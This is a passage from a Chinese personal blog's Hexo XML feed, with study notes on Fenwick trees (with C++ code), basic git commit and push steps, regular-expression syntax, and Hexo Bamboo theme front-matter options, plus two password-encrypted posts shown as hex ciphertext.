a6ee4fdf34ad698f2a707b0b97ac4e20cb8928cc17d827a25aac88f46ab5e9a35d4e7d7568470b9117ccd1043a30ddde08b19e0c6a64a47fea7d6724e2aafe3d4ed5724ac299abc056f5a2105445fe0f7d7174c3b9ac38ff0433e50b2de22779c9df7f87c1ca583f56bb7b81015f2daf213fcd5243a1376ae892294b11ec76a16d825825d98eaa795b69951e7649b8407194b98ca7941cf6874b52ae6196f98b232775e54a34b23cd85ed7a22e1fa5049e1d30cbe845e9924b24f5fd0619f9619575c3343f5d96fb950c8777c7b4f2eb86ea53afb7bc14c79f3d9cad8dee03f4e725a81c57ab56d5cbb196fda00d19ddc8dff1c66df72983c638cefbc8cc468c419b9a3613d43696c666acd752d3faad8f4791c1881fbcd31367963e285e24003fdbac79ff8b5104fd15c248d1569d0429818388cc829c73bf5bf01bf63a05895a3009f1863a957222ae4a1dde488f4dc2a7698363a580150d0bee175e8e5437e9b3797d12e9fbb59d99ccb820fe0fc7091c685374bde7e0554f158cf602cec121ca1e0db8dedb43bd12e5006b18380b4f7bfda50c0a9d70a1a160f11bc82477fcb1e939622d4cbc80d2691b2b8b7ec8415de75a03a217ed0d1b52c2037465831506f96ca10b63698254274bc5b84b3bb504f3cb881c87c4dcbeb9d5e540441b05543e1fc8651b56ea9b016bd6b37bbaa89a35d3a6400cf1fe929da81781b38fa5d5cbec5695a8ace2a000f4fc1b9dfacab3d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 闲言碎语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 勤工俭学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树状数组学习</title>
      <link href="/2022/03/23/shu-zhuang-shu-zu-xue-xi/"/>
      <url>/2022/03/23/shu-zhuang-shu-zu-xue-xi/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p><del>做了一道大水题</del>，挺有趣的，做不出来百度到可以使用<code>树状数组</code>或者<code>线段树</code>来解答，于是选择了实现起来比较简单的树状数组来解题。一开始思考了很久，想不通为啥可以使用树状数组就能解出来，逛了会b站回来就想通了（<del>逆大天</del>），在此感谢<code>xenny</code>大佬的<a href="https://www.cnblogs.com/xenny/p/9739600.html">树状数组详解</a>，帮助我学习到了一个<code>全新的知识点</code>😇。</p><h3 id="树状数组"><a href="#树状数组" class="headerlink" title="树状数组"></a>树状数组</h3><p>先来谈谈树状数组：就是拿数组来模拟树形的结构，可以解决大部分区间更新以及求和的问题。  </p><p>先看看具体的例子：  </p><p><img src="/images/tree-array.png" class="lazyload placeholder" data-srcset="/images/tree-array.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg">  </p><p>红色的为<code>C[i]</code>，黑色的为<code>A[i]</code>，关系式可以推出如下：  </p><ul><li>C[1] &#x3D; A[1];</li><li>C[2] &#x3D; A[1] + A[2];</li><li>C[3] &#x3D; A[3];</li><li>C[4] &#x3D; A[1] + A[2] + A[3] + A[4];</li><li>C[5] &#x3D; A[5];</li><li>C[6] &#x3D; A[5] + A[6];</li><li>C[7] &#x3D; A[7];</li><li>C[8] &#x3D; A[1] + A[2] + A[3] + A[4] + A[5] + A[6] + A[7] + A[8];</li></ul><p>然后就<del>自然而然</del>可以推出来一些规律性的东西：  </p><p><strong>C[i] &#x3D; A[i - 2^k+1] + A[i - 2^k+2] +…+ A[i];</strong> (其中k为就是从最低位开始，<code>第一个为1的2的指数</code>)  </p><p>又容易得出<strong>SUM（i） &#x3D; C[i] + C[i-2^k（1）] + C[(i - 2^k（1）) - 2^k（2）] + …..；</strong>(k从2^0开始往上递增，直到c[i]不存在时)</p><p>然后就到了第一个难点，我第一个看不懂的地方：<code> i&amp;(-i);</code>  </p><p>翻阅树状数组的文章时才明白是<code>前人的</code>的智慧。。。<code>2^k = i&amp;(-i);</code></p><p><del>开始偷懒复制粘贴了</del>  </p><p><code>这里利用的负数的存储特性，负数是以补码存储的，对于整数运算 x&amp;(-x)有     ● 当x为0时，即 0 &amp; 0，结果为0；     ●当x为奇数时，最后一个比特位为1，取反加1没有进位，故x和-x除最后一位外前面的位正好相反，按位与结果为0。结果为1。     ●当x为偶数，且为2的m次方时，x的二进制表示中只有一位是1（从右往左的第m+1位），其右边有m位0，故x取反加1后，从右到左第有m个0，第m+1位及其左边全是1。这样，x&amp; (-x) 得到的就是x。      ●当x为偶数，却不为2的m次方的形式时，可以写作x= y * (2^k)。其中，y的最低位为1。实际上就是把x用一个奇数左移k位来表示。这时，x的二进制表示最右边有k个0，从右往左第k+1位为1。当对x取反时，最右边的k位0变成1，第k+1位变为0；再加1，最右边的k位就又变成了0，第k+1位因为进位的关系变成了1。左边的位因为没有进位，正好和x原来对应的位上的值相反。二者按位与，得到：第k+1位上为1，左边右边都为0。结果为2^k。     总结一下：x&amp;(-x)，当x为0时结果为0；x为奇数时，结果为1；x为偶数时，结果为x中2的最大次方的因子。</code></p><p>而且这个有一个专门的称呼，叫做<code>lowbit</code>，即取<code>2^k</code>。  </p><p>下面就贴贴代码模板了：  </p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;int n,m;int a[50005],c[50005]; &#x2F;&#x2F;对应原数组和树状数组int lowbit(int x)&#123;    return x&amp;(-x);&#125;void updata(int i,int k)&#123;    &#x2F;&#x2F;在i位置加上k    while(i &lt;&#x3D; n)&#123;        c[i] +&#x3D; k;        i +&#x3D; lowbit(i);    &#125;&#125;int getsum(int i)&#123;        &#x2F;&#x2F;求A[1 - i]的和    int res &#x3D; 0;    while(i &gt; 0)&#123;        res +&#x3D; c[i];        i -&#x3D; lowbit(i);    &#125;    return res;&#125;int main()&#123;    int t;    cin&gt;&gt;t;    for(int tot &#x3D; 1; tot &lt;&#x3D; t; tot++)&#123;        cout &lt;&lt; &quot;Case &quot; &lt;&lt; tot &lt;&lt; &quot;:&quot; &lt;&lt; endl;        memset(a, 0, sizeof a);        memset(c, 0, sizeof c);        cin&gt;&gt;n;        for(int i &#x3D; 1; i &lt;&#x3D; n; i++)&#123;            cin&gt;&gt;a[i];            updata(i,a[i]);   &#x2F;&#x2F;输入初值的时候，也相当于更新了值        &#125;        string s;        int x,y;        while(cin&gt;&gt;s &amp;&amp; s[0] !&#x3D; &#39;E&#39;)&#123;            cin&gt;&gt;x&gt;&gt;y;            if(s[0] &#x3D;&#x3D; &#39;Q&#39;)&#123;    &#x2F;&#x2F;求和操作                int sum &#x3D; getsum(y) - getsum(x-1);    &#x2F;&#x2F;x-y区间和也就等于1-y区间和减去1-(x-1)区间和                cout &lt;&lt; sum &lt;&lt; endl;            &#125;            else if(s[0] &#x3D;&#x3D; &#39;A&#39;)&#123;                updata(x,y);            &#125;            else if(s[0] &#x3D;&#x3D; &#39;S&#39;)&#123;                updata(x,-y);    &#x2F;&#x2F;减去操作，即为加上相反数            &#125;        &#125;    &#125;    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关于树状数组的变形，有时间再写吧（<del>可能不会再写了，毕竟就是学这一段时间</del></p><p>————————————————</p><h3 id="原题目"><a href="#原题目" class="headerlink" title="原题目"></a>原题目</h3><p>题目竟然叫作<code>这是一道大水题</code>，焯😡</p><p><img src="/images/tree-sum.png" class="lazyload placeholder" data-srcset="/images/tree-sum.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg">  </p><p>对应AC的代码：  </p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;bits&#x2F;stdc++.h&gt; using namespace std;typedef long long ll;ll a[300005],c[300005]&#x3D;&#123;0&#125;;ll n,m;ll result&#x3D;0;inline ll read()&#123;int x&#x3D;0,f&#x3D;1;char ch&#x3D;getchar();    while(ch&lt;&#39;0&#39;||ch&gt;&#39;9&#39;)&#123;if(ch&#x3D;&#x3D;&#39;-&#39;)f&#x3D;-1;ch&#x3D;getchar();&#125;    while(ch&gt;&#x3D;&#39;0&#39;&amp;&amp;ch&lt;&#x3D;&#39;9&#39;)&#123;x&#x3D;x*10+ch-&#39;0&#39;;ch&#x3D;getchar();&#125;    return x*f;&#125;ll lowbit(ll x)&#123;return x&amp;(-x);&#125;void update(ll i,ll value)&#123;while(i&lt;&#x3D;n)&#123;c[i]+&#x3D;value;i+&#x3D;lowbit(i);&#125;&#125;ll getsum(ll i )&#123;ll sum&#x3D;0;while(i&gt;0)&#123;sum+&#x3D;c[i];i-&#x3D;lowbit(i);&#125;return sum;&#125;int main()&#123;n&#x3D;read();m&#x3D;read();while(m--)&#123;ll c;c&#x3D;read();if(c&#x3D;&#x3D;0)&#123;ll left,right,value;left&#x3D;read();right&#x3D;read();value&#x3D;read();ll temp&#x3D;(right-left+1)*value;result+&#x3D;temp;update(left,temp);update(right+1,-temp);&#125;else &#123;ll pos;pos&#x3D;read();cout&lt;&lt;result-getsum(pos)&lt;&lt;endl;&#125; &#125;  return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 树状数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于github本地项目提交</title>
      <link href="/2022/03/22/guan-yu-github-ben-di-xiang-mu-ti-jiao/"/>
      <url>/2022/03/22/guan-yu-github-ben-di-xiang-mu-ti-jiao/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p><code>github</code>项目提交的步骤总是会忘记，所以开一篇文章来记录一下，仅记录最简单的第一种方式。  </p><p>查阅的文章：<a href="https://www.cnblogs.com/du-hong/p/9921214.html">Git的使用–如何将本地项目上传到Github（三种简单、方便的方法）</a>  </p><h3 id="第一种方式"><a href="#第一种方式" class="headerlink" title="第一种方式"></a>第一种方式</h3><p>首先本地下载安装git工具  </p><p>登录<code>github</code>，<code>new repository</code> 新建一个新的项目  </p><p>记得新建完项目之后，copy一下<code>https</code>的项目地址  </p><p>然后来到本地操作，来到项目文件夹，右键git bash here 打开命令行  </p><p><code>git clone 项目名称</code> 把仓库克隆到本地上面  </p><p>再把自己项目的所有文件copy到刚刚建立的仓库文件夹  </p><p><code>cd</code>到仓库文件夹  </p><p>接下来依次输入一下代码即可完成剩余操作：  </p><p><code>git add *</code>  </p><p><code>git commit -m &quot;备注的提交信息&quot;</code>  </p><p><code>git push -u origin main（这个是你分支的名称）</code></p><p>————————————————————</p>]]></content>
      
      
      <categories>
          
          <category> github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RegExp学习</title>
      <link href="/2022/03/20/regexp-xue-xi/"/>
      <url>/2022/03/20/regexp-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>其实很早就接触<code>正则表达式</code>了，知识一直没有系统学习，总是记了一部分就会忘记，所以这一次记录一下学习的过程。  学习的网站是：<a href="https://www.runoob.com/regexp/regexp-syntax.html">菜鸟教程的正则表达式教学</a>(所以可能都是复制粘贴，经典CV大法hhhhh</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul><li><strong>runoo+b</strong>，可以匹配 <strong>runoob、runooob、runoooooob</strong> 等，**+** 号代表前面的字符必须至少出现一次（1次或多次）。</li><li><strong>runoo*b</strong>，可以匹配 <strong>runob、runoob、runoooooob</strong> 等，***** 号代表前面的字符可以不出现，也可以出现一次或者多次（0次、或1次、或多次）。</li><li><strong>colou?r</strong> 可以匹配 <strong>color</strong> 或者 <strong>colour</strong>，**?** 问号代表前面的字符最多只可以出现一次（0次或1次）。</li></ul><p><code>/[^aeiou]/</code>匹配除了 <strong>[…]</strong> 中字符的所有字符，例如 <strong>[^aeiou]</strong> 匹配字符串 “google runoob taobao” 中除了 e o u a 字母的所有字母。  </p><p><code>/[A-Z]/g</code> 表示一个区间，匹配所有大写字母，[a-z] 表示所有小写字母。    </p><p><code>/./g</code>  匹配除换行符<code>（\n、\r）</code>之外的任何单个字符，相等于<code> [^\n\r]</code>。  </p><p><code>/[\s\S]/g</code>  匹配所有。<code>\s </code>是匹配所有空白符，包括换行，<code>\S </code>非空白符，不包括换行。  </p><p><code>/[\w]/</code>  匹配字母、数字、下划线。等价于<code> [A-Za-z0-9_]</code>  </p><h4 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h4><table><thead><tr><th align="left">特别字符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">$</td><td align="left">匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 $。</td></tr><tr><td align="left">( )</td><td align="left">标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。</td></tr><tr><td align="left">*</td><td align="left">匹配前面的子表达式零次或多次。要匹配 * 字符，请使用<code> \*</code>。</td></tr><tr><td align="left">+</td><td align="left">匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 <code>\+</code>。</td></tr><tr><td align="left">.</td><td align="left">匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用<code>\.</code>。</td></tr><tr><td align="left">[</td><td align="left">标记一个中括号表达式的开始。要匹配 [，请使用<code> \[</code>。</td></tr><tr><td align="left">?</td><td align="left">匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用<code> \?</code>。</td></tr><tr><td align="left">\</td><td align="left">将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。</td></tr><tr><td align="left">^</td><td align="left"><strong>匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合</strong>。要匹配 ^ 字符本身，请使用 <code>\^</code>。</td></tr><tr><td align="left">{</td><td align="left">标记限定符表达式的开始。要匹配 {，请使用<code> \&#123;</code>。</td></tr><tr><td align="left">|</td><td align="left">指明两项之间的一个选择。要匹配 |，请使用 <code>|</code>。</td></tr></tbody></table><h4 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h4><table><thead><tr><th align="left">字符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">*</td><td align="left">匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td></tr><tr><td align="left">+</td><td align="left">匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td></tr><tr><td align="left">?</td><td align="left">匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</td></tr><tr><td align="left">{n}</td><td align="left">n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td></tr><tr><td align="left">{n,}</td><td align="left">n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td></tr><tr><td align="left">{n,m}</td><td align="left">m 和 n 均为非负整数，其中n &lt;&#x3D; m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td></tr></tbody></table><h4 id="定位符"><a href="#定位符" class="headerlink" title="定位符"></a>定位符</h4><table><thead><tr><th align="left">字符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">^</td><td align="left">匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 \n 或 \r 之后的位置匹配。</td></tr><tr><td align="left">$</td><td align="left">匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与 \n 或 \r 之前的位置匹配。</td></tr><tr><td align="left">\b</td><td align="left">匹配一个单词边界，即字与空格间的位置。</td></tr><tr><td align="left">\B</td><td align="left">非单词边界匹配。</td></tr></tbody></table><h4 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h4><p>用圆括号 <strong>()</strong> 将所有选择项括起来，相邻的选择项之间用 <strong>|</strong> 分隔。  </p><p><strong>()</strong> 表示捕获分组，**()** 会把每个分组里的匹配的值保存起来， 多个匹配值可以通过数字 n 来查看(<strong>n</strong> 是一个数字，表示第 n 个捕获组的内容)。  </p><p>但用圆括号会有一个副作用，使相关的匹配会被缓存，此时可用 <strong>?:</strong> 放在第一个选项前来消除这种副作用。</p><p>其中 <strong>?:</strong> 是非捕获元之一，还有两个非捕获元是 <strong>?&#x3D;</strong> 和 **?!**，这两个还有更多的含义，前者为正向预查，在任何开始匹配圆括号内的正则表达式模式的位置来匹配搜索字符串，后者为负向预查，在任何开始不匹配该正则表达式模式的位置来匹配搜索字符串。</p><p><img src="https://www.runoob.com/wp-content/uploads/2014/03/366574CC-3706-4B4C-8782-1BFF4CF57582.jpg" class="lazyload placeholder" data-srcset="https://www.runoob.com/wp-content/uploads/2014/03/366574CC-3706-4B4C-8782-1BFF4CF57582.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p> <code>exp1(?=exp2)</code>：查找 exp2 前面的 exp1。  </p><p><img src="https://www.runoob.com/wp-content/uploads/2014/03/reg-111.jpg" class="lazyload placeholder" data-srcset="https://www.runoob.com/wp-content/uploads/2014/03/reg-111.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><table><thead><tr><th align="left">修饰符</th><th align="left">含义</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">i</td><td align="left">ignore - 不区分大小写</td><td align="left">将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。</td></tr><tr><td align="left">g</td><td align="left">global - 全局匹配</td><td align="left">查找所有的匹配项。</td></tr><tr><td align="left">m</td><td align="left">multi line - 多行匹配</td><td align="left">使边界字符 <strong>^</strong> 和 <strong>$</strong> 匹配每一行的开头和结尾，记住是多行，而不是整个字符串的开头和结尾。</td></tr><tr><td align="left">s</td><td align="left">特殊字符圆点 <strong>.</strong> 中包含换行符 <strong>\n</strong></td><td align="left">默认情况下的圆点 <strong>.</strong> 是 匹配除换行符 <strong>\n</strong> 之外的任何字符，加上 <strong>s</strong> 修饰符之后, <strong>.</strong> 中包含换行符 \n。</td></tr></tbody></table><h3 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h3><table><thead><tr><th align="left">\d</th><th>匹配一个数字字符。等价于 [0-9]。</th></tr></thead><tbody><tr><td align="left">\D</td><td>匹配一个非数字字符。等价于 <code>[^0-9]</code>。</td></tr><tr><td align="left">\f</td><td>匹配一个换页符。等价于 \x0c 和 \cL。</td></tr><tr><td align="left">\n</td><td>匹配一个换行符。等价于 \x0a 和 \cJ。</td></tr><tr><td align="left">\r</td><td>匹配一个回车符。等价于 \x0d 和 \cM。</td></tr><tr><td align="left">\s</td><td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于 <code>[ \f\n\r\t\v]</code>。</td></tr><tr><td align="left">\S</td><td>匹配任何非空白字符。等价于<code>[^ \f\n\r\t\v]</code>。</td></tr><tr><td align="left">\t</td><td>匹配一个制表符。等价于 \x09 和 \cI。</td></tr><tr><td align="left">\v</td><td>匹配一个垂直制表符。等价于 \x0b 和 \cK。</td></tr><tr><td align="left">\w</td><td>匹配字母、数字、下划线。等价于<code>&#39;[A-Za-z0-9_]&#39;</code>。</td></tr><tr><td align="left">\W</td><td>匹配非字母、数字、下划线。等价于<code> &#39;[^A-Za-z0-9_]&#39;</code>。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> regexp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-bamboo文章Front-matter介绍</title>
      <link href="/2022/03/20/hexo-bamboo-wen-zhang-front-matter-jie-shao/"/>
      <url>/2022/03/20/hexo-bamboo-wen-zhang-front-matter-jie-shao/</url>
      
        <content type="html"><![CDATA[<h1 id="文章Front-matter介绍"><a href="#文章Front-matter介绍" class="headerlink" title="文章Front-matter介绍"></a>文章Front-matter介绍</h1><p>这个front-matter指的就是你文章写在最前面的那些参数，只针对这篇文章，下面的是hexo主题bamboo的参数，如下：  </p><pre class="line-numbers language-none"><code class="language-none">---title: Hexo主题--Bamboo介绍date: 2020-09-14 14:06swiper: true # 将该文章放入轮播图中swiperImg: &#39;&#x2F;medias&#x2F;1.jpg&#39; # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http:&#x2F;&#x2F;xxx图片swiperDesc: &#39;文章的front-matter编辑&#39;img: &#39;&#x2F;medias&#x2F;1.jpg&#39; # 该文章图片，可以是本地目录下图片也可以是http:&#x2F;&#x2F;xxx图片categories: 前端tags: [Hexo, hexo-theme-bamboo]top: true---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p><table><thead><tr><th align="left">配置选项</th><th align="left">默认值</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">title</td><td align="left"><code>Markdown</code> 的文件标题</td><td align="left">文章标题，强烈建议填写此选项</td></tr><tr><td align="left">date</td><td align="left">文件创建时的日期时间</td><td align="left">发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td align="left">swiper</td><td align="left">false</td><td align="left">表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td align="left">swiperImg</td><td align="left">无</td><td align="left">表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td align="left">swiperDesc</td><td align="left">无</td><td align="left">表示该文章在首页轮播封面需要显示的文字描述（摘要），如果没有，则使用<code>excerpt</code>，如果<code>excerpt</code>也没有，则取文章内容</td></tr><tr><td align="left">img</td><td align="left">无</td><td align="left">文章特征图，该文章显示的图片，没有则默认使用文章的特色图片</td></tr><tr><td align="left">excerpt</td><td align="left">无</td><td align="left">文章描述（摘要），该文章在首页的描述文字，如果没有，则取<code>swiperDesc</code>,如果<code>swiperDesc</code>也没有，则取文章内容（优先取<code>&lt;!-- more --&gt;</code>上面的内容）</td></tr><tr><td align="left">top</td><td align="left">false</td><td align="left">将该值设为true，则将该篇文章显示在首页的置顶栏目中</td></tr><tr><td align="left">toc</td><td align="left">true</td><td align="left">将该值设为false，则该篇文章不显示右侧目录</td></tr><tr><td align="left">tocOpen</td><td align="left">true</td><td align="left">将该值设为false，则该篇文章右侧目录默认收缩</td></tr><tr><td align="left">onlyTitle</td><td align="left">false</td><td align="left">文章详情页头部是否只显示标题，不显示日期等信息</td></tr><tr><td align="left">comments</td><td align="left">true</td><td align="left">将该值设为false，则该篇文章不显示评论</td></tr><tr><td align="left">share</td><td align="left">true</td><td align="left">将该值设为false，则该篇文章不显示分享按钮</td></tr><tr><td align="left">copyright</td><td align="left">true</td><td align="left">将该值设为false，则该篇文章不显示版权声明</td></tr><tr><td align="left">donate</td><td align="left">true</td><td align="left">将该值设为false，则该篇文章不显示打赏按钮</td></tr><tr><td align="left">bgImg</td><td align="left">-</td><td align="left">单独为这篇文章设置背景图片或者背景颜色，可以是数组，数组里面放图片链接，可以是字符串，字符串里面是颜色值，空值则背景颜色透明</td></tr><tr><td align="left">bgImgTransition</td><td align="left">fade</td><td align="left">该篇文章的bgImg设置为数组,该值表示背景图片切换的动画, 有三种值（fade, scale, translate-fade）</td></tr><tr><td align="left">bgImgDelay</td><td align="left">180000(三分钟)</td><td align="left">该篇文章的bgImg设置为数组,该值表示背景图片切换的延迟时间,</td></tr><tr><td align="left">categories</td><td align="left">无</td><td align="left">文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td align="left">prismjs</td><td align="left">无</td><td align="left">如果使用的是hexo自带的prismjs代码高亮，通过设置该值为该篇文章设置不同的代码高亮主题（default, coy, dark, funky, okaidia, solarizedlight, tomorrow, twilight）</td></tr><tr><td align="left">tags</td><td align="left">无</td><td align="left">文章标签，一篇文章可以多个标签</td></tr><tr><td align="left">mathjax</td><td align="left">false</td><td align="left">mathjax公式</td></tr><tr><td align="left">imgTop</td><td align="left">true</td><td align="left">设置为<code>false</code>则文章和自定义页面顶部不要图片</td></tr></tbody></table><p>果然做<code>搬运工</code>非常舒适，直接搬了<code>yuang大佬</code>的，方便自己以后查看！</p>]]></content>
      
      
      <categories>
          
          <category> bamboo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> bamboo </tag>
            
            <tag> front-matter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>建站历程</title>
      <link href="/2022/03/20/jian-zhan-li-cheng/"/>
      <url>/2022/03/20/jian-zhan-li-cheng/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="331f81d64f89df91591dddd5ae48048c8fce24146384d8c027a5a36613b7ffc4">2cf9f0e39f26ddd937cd5eb31197d2f709799e0107d13d77fa0dec990dba703a79dc0b71d5dde29261641f59dd5bf3608b85183b214a2229e5c7f5638ca89cfb1a7cab5d399463afa27229db8ef5671da3e8d5ac3b4971669d10acb62b011b2d55c5e6a5b42867ccf67394ccdaba4a8cd3215d7358ede93e33185b7dab5aa24c450736dbbc5b8be01fcb13262096d0a120c3b784559e76c7b005ba4d699ae714c456d8300bae9036d1629efa536c364f7d1fa9a409ab70056dc7bb9b437156e9fb5fe11c5bda4c5dda81c14fd94f5b17f6601278d4db85c4e31b8be10c42eb050670caec7ca7a249819d031e5adbacca8e7bfcad743b0f9e1791e851359bc7a3adcf1481677a2bea8064f629ee110c4e4fa2da66e8647e5e7579ce5afe4a566d7986fb3d10a84b449b01c0397c3ce90e9a1cb6d215b60bccf9ce34b690a7b9cefb179ffd47feae8bed6f9c98dc44a79e7a95a1533ed776207f53a4bbcaf1af8d815fbef3f026e3a763b6b857214501f99f82909ef9404246e6e7a078cfa5463fcee73183e5e980ccc26a28104837664ed9a60ff2616c7e0dc77e036069948bd923496bdaa7262e8b3670440ff0e3bb6c7d16843bd3e15a7a87aba0be8c09f591a4695a07ad80b5d8fc5746763d16206a1155ba5628501d158fc03da5f8a53009a3579111a2a9fde8854c7d4f8cbe49275113aeece381a774d60fc852c16aaa9152a50a57372d2b1c3290bc10f36211a8cbe593120c35fee21ef0fe216ee08f6fe91015b60486ffa16813e0125a173cc50a92275840acf4507791bbd48726be7d18ac20afdfc529574c888e87bb959fb2dbd5d0eff53a610f95bc3c16d52d24bdd7c6f1607e7a64fc492bc07fedeeb98ab9c9d4f4cf8eac078753f5d6fc1a13ec93497392f8be05c547560821265825682804996ac104a5a9b6eac427b02c18e7bfc5050d60b080540b3607294dad6c4342fe602fd113c194b54f440b2d84e710fbb6ad290d219b53a2f4e6ec63ebdb39d6f87c79816760cc1ba78ff5f3af9a484f270d2969184e75150a141dcfe977feb8246d227b42b60ebbc4562dcec59cb97652d22823bef2d55da100762dc25b1d21c5a406353d893a3096460bffc33f0450288d1dbbfb8d30fda579f116fed536ae86292acdc31323d63b7f68edccccd1d12fe852e8e969e71553b2b57703bb94f0f4b4f35d948fecbabdf6f542e874daf11772ee54b20c77fdfc4fbe135c86d2